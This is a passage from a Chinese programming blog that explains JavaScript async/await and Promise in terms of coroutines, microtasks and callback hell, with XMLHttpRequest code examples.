class="string">&#x27;https://www.geekbang.org/test&#x27;</span>)</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;response2&#x27;</span>)</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(response2)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">co</span>(<span class="title function_">foo</span>());</span><br></pre></td></tr></table></figure>
<p>通过使用生成器配合执行器，就能实现使用同步的方式写出异步代码了，这样也大大加强了代码的可读性。</p>
<h1 id="async-x2F-await"><a href="#async-x2F-await" class="headerlink" title="async&#x2F;await"></a>async&#x2F;await</h1><p>虽然生成器已经能很好地满足我们的需求了，但是程序员的追求是无止境的，这不又在 ES7 中引入了<code>async/await</code>，这种方式能够彻底告别执行器和生成器，实现更加直观简洁的代码。其实<code>async/await</code>技术背后的秘密就是<code>Promise</code>和生成器应用，往低层说就是微任务和协程应用。要搞清楚<code>async</code>和<code>await</code>的工作原理，我们就得对<code>async</code>和<code>await</code>分开分析。</p>
<h2 id="1-async"><a href="#1-async" class="headerlink" title="1. async"></a>1. async</h2><p>我们先来看看<code>async</code>到底是什么？根据 MDN 定义，<code>async</code>是一个通过异步执行并隐式返回<code>Promise</code>作为结果的函数。</p>
<p>对<code>async</code>函数的理解，这里需要重点关注两个词：异步执行和隐式返回<code>Promise</code>。</p>
<p>关于异步执行的原因，我们一会儿再分析。这里我们先来看看是如何隐式返回<code>Promise</code>的，你可以参考下面的代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>())  <span class="comment">// Promise &#123;&lt;resolved&gt;: 2&#125;</span></span><br></pre></td></tr></table></figure>
<p>执行这段代码，我们可以看到调用<code>async</code>声明的<code>foo</code>函数返回了一个<code>Promise</code>对象，状态是<code>resolved</code>，返回结果如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span> &#123;&lt;resolved&gt;: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-await"><a href="#2-await" class="headerlink" title="2. await"></a>2. await</h2><p>我们知道了<code>async</code>函数返回的是一个<code>Promise</code>对象，那下面我们再结合文中这段代码来看看<code>await</code>到底是什么。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">let</span> a = <span class="keyword">await</span> <span class="number">100</span></span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0</span>)</span><br><span class="line"><span class="title function_">foo</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>观察上面这段代码，你能判断出打印出来的内容是什么吗？这得先来分析<code>async</code>结合<code>await</code>到底会发生什么。我们先站在协程的视角来看看这段代码的整体执行流程图：</p>
<img src="/2019/12/06/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94async%20await/img3.png" class="" title="async&#x2F;await 执行流程图">

<p>结合上图，我们来一起分析下<code>async/await</code>的执行流程。</p>
<p>首先，执行<code>console.log(0)</code>这个语句，打印出来 0。</p>
<p>紧接着就是执行<code>foo</code>函数，由于<code>foo</code>函数是被<code>async</code>标记过的，所以当进入该函数的时候，JavaScript 引擎会保存当前的调用栈等信息，然后执行<code>foo</code>函数中的<code>console.log(1)</code>语句，并打印出 1。</p>
<p>接下来就执行到<code>foo</code>函数中的<code>await 100</code>这个语句了，这里是我们分析的重点，因为在执行<code>await 100</code>这个语句时，JavaScript 引擎在背后为我们默默做了太多的事情，那么下面我们就把这个语句拆开，来看看 JavaScript 到底都做了哪些事情。</p>
<p>当执行到<code>await 100</code>时，会默认创建一个<code>Promise</code>对象，代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> promise_ = <span class="keyword">new</span> <span class="title class_">Promise</span>((resolve,reject) &#123;</span><br><span class="line">  <span class="title function_">resolve</span>(<span class="number">100</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>在这个<code>promise_</code>对象创建的过程中，我们可以看到在<code>executor</code>函数中调用了<code>resolve</code>函数，JavaScript 引擎会将该任务提交给微任务队列。</p>
<p>然后 JavaScript 引擎会暂停当前协程的执行，将主线程的控制权转交给父协程执行，同时会将<code>promise_</code>对象返回给父协程。</p>
<p>主线程的控制权已经交给父协程了，这时候父协程要做的一件事是调用<code>promise_.then</code>来监控<code>promise</code>状态的改变。</p>
<p>接下来继续执行父协程的流程，这里我们执行<code>console.log(3)</code>，并打印出来 3。随后父协程将执行结束，在结束之前，会进入微任务的检查点，然后执行微任务队列，微任务队列中有<code>resolve(100)</code>的任务等待执行，执行到这里的时候，会触发<code>promise_.then</code>中的回调函数，如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">promise_.<span class="title function_">then</span>(<span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 回调函数被激活后</span></span><br><span class="line">  <span class="comment">// 将主线程控制权交给 foo 协程，并将 vaule 值传给协程</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>该回调函数被激活以后，会将主线程的控制权交给<code>foo</code>函数的协程，并同时将<code>value</code>值传给该协程。</p>
<p><code>foo</code>协程激活之后，会把刚才的<code>value</code>值赋给了变量<code>a</code>，然后<code>foo</code>协程继续执行后续语句，执行完成之后，将控制权归还给父协程。</p>
<p>以上就是<code>await/async</code>的执行流程。正是因为<code>async</code>和<code>await</code>在背后为我们做了大量的工作，所以我们才能用同步的方式写出异步代码来。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><code>Promise</code>的编程模型依然充斥着大量的<code>then</code>方法，虽然解决了回调地狱的问题，但是在语义方面依然存在缺陷，代码中充斥着大量的<code>then</code>函数，这就是<code>async/await</code>出现的原因。</p>
<p>使用<code>async/await</code>可以实现用同步代码的风格来编写异步代码，这是因为<code>async/await</code>的基础技术使用了生成器和<code>Promise</code>，生成器是协程的实现，利用生成器能实现生成器函数的暂停和恢复。</p>
<p>另外，V8 引擎还为<code>async/await</code>做了大量的语法层面包装，所以了解隐藏在背后的代码有助于加深你对<code>async/await</code>的理解。</p>
<p><code>async/await</code>无疑是异步编程领域非常大的一个革新，也是未来的一个主流的编程风格。其实，除了 JavaScript，Python、Dart、C# 等语言也都引入了<code>async/await</code>，使用它不仅能让代码更加整洁美观，而且还能确保该函数始终都能返回<code>Promise</code>。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/" rel="tag">JS事件循环机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS事件循环机制——Promise"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/05/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94Promise/"
    >JS事件循环机制——Promise</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/12/05/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94Promise/" class="article-date">
  <time datetime="2019-12-05T11:22:51.000Z" itemprop="datePublished">2019-12-05</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p><code>Promise</code>解决的是异步编码风格的问题。</p>
<h1 id="异步编程的问题：代码逻辑不连续"><a href="#异步编程的问题：代码逻辑不连续" class="headerlink" title="异步编程的问题：代码逻辑不连续"></a>异步编程的问题：代码逻辑不连续</h1><p>页面中任务都是执行在主线程之上的，相对于页面来说，主线程就是它整个的世界，所以在执行一项耗时的任务时，比如下载网络文件任务、获取摄像头等设备信息任务，这些任务都会放到页面主线程之外的进程或者线程中去执行，这样就避免了耗时任务“霸占”页面主线程的情况。你可以结合下图来看看这个处理过程：</p>
<img src="/2019/12/05/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94Promise/img1.png" class="" title="Web 应用的异步编程模型">

<p>上图展示的是一个标准的异步编程模型，页面主线程发起了一个耗时的任务，并将任务交给另外一个进程去处理，这时页面主线程会继续执行消息队列中的任务。等该进程处理完这个任务后，会将该任务添加到渲染进程的消息队列中，并排队等待循环系统的处理。排队结束之后，循环系统会取出消息队列中的任务进行处理，并触发相关的回调操作。</p>
<p>这就是页面编程的一大特点：异步回调。</p>
<p>Web 页面的单线程架构决定了异步回调，而异步回调影响到了我们的编码方式，到底是如何影响的呢？</p>
<p>假设有一个下载的需求，使用<code>XMLHttpRequest</code>来实现，具体的实现方式你可以参考下面这段代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 执行状态</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onResolve</span>(<span class="params">response</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onReject</span>(<span class="params">error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">xhr.<span class="property">ontimeout</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="title function_">onReject</span>(e)</span><br><span class="line">&#125;</span><br><span class="line">xhr.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="title function_">onReject</span>(e)</span><br><span class="line">&#125;</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">onResolve</span>(xhr.<span class="property">response</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置请求类型，请求 URL，是否同步信息</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">URL</span> = <span class="string">&#x27;https://time.geekbang.com&#x27;</span></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;Get&#x27;</span>, <span class="variable constant_">URL</span>, <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置参数</span></span><br><span class="line">xhr.<span class="property">timeout</span> = <span class="number">3000</span> <span class="comment">// 设置 xhr 请求的超时时间</span></span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;text&#x27;</span> <span class="comment">// 设置响应返回的数据格式</span></span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;X_TEST&#x27;</span>, <span class="string">&#x27;time.geekbang&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发出请求</span></span><br><span class="line">xhr.<span class="title function_">send</span>()</span><br></pre></td></tr></table></figure>
<p>我们执行上面这段代码，可以正常输出结果的。但是，这短短的一段代码里面竟然出现了五次回调，这么多的回调会导致代码的逻辑不连贯、不线性，非常不符合人的直觉，这就是异步回调影响到我们的编码方式。</p>
<p>那有什么方法可以解决这个问题吗？当然有，我们可以封装这堆凌乱的代码，降低处理异步回调的次数。</p>
<h1 id="封装异步代码，让处理流程变得线性"><a href="#封装异步代码，让处理流程变得线性" class="headerlink" title="封装异步代码，让处理流程变得线性"></a>封装异步代码，让处理流程变得线性</h1><p>由于我们重点关注的是输入内容（请求信息）和输出内容（回复信息），至于中间的异步请求过程，我们不想在代码里面体现太多，因为这会干扰核心的代码逻辑。整体思路如下图所示：</p>
<img src="/2019/12/05/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94Promise/img2.png" class="" title="封装请求过程">

<p>从图中你可以看到，我们将<code>XMLHttpRequest</code>请求过程的代码封装起来了，重点关注输入数据和输出结果。</p>
<p>那我们就按照这个思路来改造代码。首先，我们把输入的 HTTP 请求信息全部保存到一个<code>request</code>的结构中，包括请求地址、请求头、请求方式、引用地址、同步请求还是异步请求、安全设置等信息。<code>request</code>结构如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//makeRequest 用来构造 request 对象</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeRequest</span>(<span class="params">request_url</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> request = &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;Get&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: request_url,</span><br><span class="line">    <span class="attr">headers</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">body</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">credentials</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">sync</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">responseType</span>: <span class="string">&#x27;text&#x27;</span>,</span><br><span class="line">    <span class="attr">referrer</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> request</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后就可以封装请求过程了，这里我们将所有的请求细节封装进<code>XFetch</code>函数，<code>XFetch</code>代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[in] request，请求信息，请求头，延时值，返回类型等</span></span><br><span class="line"><span class="comment">//[out] resolve, 执行成功，回调该函数</span></span><br><span class="line"><span class="comment">//[out] reject 执行失败，回调该函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">XFetch</span>(<span class="params">request, resolve, reject</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">  xhr.<span class="property">ontimeout</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title function_">reject</span>(e)</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title function_">reject</span>(e)</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((xhr.<span class="property">status</span> = <span class="number">200</span>)) <span class="title function_">resolve</span>(xhr.<span class="property">response</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.<span class="title function_">open</span>(request.<span class="property">method</span>, <span class="variable constant_">URL</span>, request.<span class="property">sync</span>)</span><br><span class="line">  xhr.<span class="property">timeout</span> = request.<span class="property">timeout</span></span><br><span class="line">  xhr.<span class="property">responseType</span> = request.<span class="property">responseType</span></span><br><span class="line">  <span class="comment">// 补充其他请求信息</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  xhr.<span class="title function_">send</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个<code>XFetch</code>函数需要一个<code>request</code>作为输入，然后还需要两个回调函数<code>resolve</code>和<code>reject</code>，当请求成功时回调<code>resolve</code>函数，当请求出现问题时回调<code>reject</code>函数。</p>
<p>有了这些后，我们就可以来实现业务代码了，具体的实现方式如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">XFetch</span>(</span><br><span class="line">  <span class="title function_">makeRequest</span>(<span class="string">&#x27;https://time.geekbang.org&#x27;</span>),</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">  &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h1 id="新的问题：回调地狱"><a href="#新的问题：回调地狱" class="headerlink" title="新的问题：回调地狱"></a>新的问题：回调地狱</h1><p>上面的示例代码已经比较符合人的线性思维了，在一些简单的场景下运行效果也是非常好的，不过一旦接触到稍微复杂点的项目时，你就会发现，如果嵌套了太多的回调函数就很容易使得自己陷入了回调地狱，不能自拔。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">XFetch</span>(<span class="title function_">makeRequest</span>(<span class="string">&#x27;https://time.geekbang.org/?category&#x27;</span>),</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">response</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">    <span class="title class_">XFetch</span>(<span class="title function_">makeRequest</span>(<span class="string">&#x27;https://time.geekbang.org/column&#x27;</span>),</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">response</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">        <span class="title class_">XFetch</span>(<span class="title function_">makeRequest</span>(<span class="string">&#x27;https://time.geekbang.org&#x27;</span>)</span><br><span class="line">          <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">response</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(response)</span><br><span class="line">          &#125;, <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;, <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
<p>这段代码是先请求<code>time.geekbang.org/?category</code>，如果请求成功的话，那么再请求<code>time.geekbang.org/column</code>，如果再次请求成功的话，就继续请求<code>time.geekbang.org</code>。也就是说这段代码用了三层嵌套请求，就已经让代码变得混乱不堪，所以，我们还需要解决这种嵌套调用后混乱的代码结构。</p>
<p>这段代码之所以看上去很乱，归结其原因有两点：</p>
<ul>
<li>第一是嵌套调用，下面的任务依赖上个任务的请求结果，并在上个任务的回调函数内部执行新的业务逻辑，这样当嵌套层次多了之后，代码的可读性就变得非常差了。</li>
<li>第二是任务的不确定性，执行每个任务都有两种可能的结果（成功或者失败），所以体现在代码中就需要对每个任务的执行结果做两次判断，这种对每个任务都要进行一次额外的错误处理的方式，明显增加了代码的混乱程度。</li>
</ul>
<p>原因分析出来后，那么问题的解决思路就很清晰了：</p>
<ul>
<li>第一是消灭嵌套调用；</li>
<li>第二是合并多个任务的错误处理。</li>
</ul>
<p>这么讲可能有点抽象，不过<code>Promise</code>已经帮助我们解决了这两个问题。那么接下来我们就来看看<code>Promise</code>是怎么消灭嵌套调用和合并多个任务的错误处理的。</p>
<h1 id="Promise：消灭嵌套调用和多次错误处理"><a href="#Promise：消灭嵌套调用和多次错误处理" class="headerlink" title="Promise：消灭嵌套调用和多次错误处理"></a>Promise：消灭嵌套调用和多次错误处理</h1><p>首先，我们使用<code>Promise</code>来重构<code>XFetch</code>的代码，示例代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">XFetch</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">executor</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, request.<span class="property">url</span>, <span class="literal">true</span>)</span><br><span class="line">    xhr.<span class="property">ontimeout</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="title function_">reject</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="title function_">reject</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>, <span class="variable language_">this</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> error = &#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="variable language_">this</span>.<span class="property">status</span>,</span><br><span class="line">            <span class="attr">response</span>: <span class="variable language_">this</span>.<span class="property">response</span>,</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">reject</span>(error, <span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr.<span class="title function_">send</span>()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(executor)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来，我们再利用<code>XFetch</code>来构造请求流程，代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x1 = <span class="title class_">XFetch</span>(<span class="title function_">makeRequest</span>(<span class="string">&#x27;https://time.geekbang.org/?category&#x27;</span>))</span><br><span class="line"><span class="keyword">var</span> x2 = x1.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">XFetch</span>(<span class="title function_">makeRequest</span>(<span class="string">&#x27;https://www.geekbang.org/column&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">var</span> x3 = x2.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(value)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">XFetch</span>(<span class="title function_">makeRequest</span>(<span class="string">&#x27;https://time.geekbang.org&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line">x3.<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(error)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>你可以观察上面这两段代码，重点关注下<code>Promise</code>的使用方式。</p>
<ul>
<li>首先我们引入了<code>Promise</code>，在调用<code>XFetch</code>时，会返回一个<code>Promise</code>对象。</li>
<li>构建<code>Promise</code>对象时，需要传入一个<code>executor</code>函数，<code>XFetch</code>的主要业务流程都在<code>executor</code>函数中执行。</li>
<li>如果运行在<code>excutor</code>函数中的业务执行成功了，会调用 resolve 函数；如果执行失败了，则调用<code>reject</code>函数。</li>
<li>在<code>excutor</code>函数中调用<code>resolve</code>函数时，会触发<code>promise.then</code>设置的回调函数；而调用<code>reject</code>函数时，会触发<code>promise.catch</code>设置的回调函数。</li>
</ul>
<p>通过引入<code>Promise</code>，上面这段代码看起来就非常线性了，也非常符合人的直觉，基于这段代码，我们就可以来分析<code>Promise</code>是如何消灭嵌套回调和合并多个错误处理了。</p>
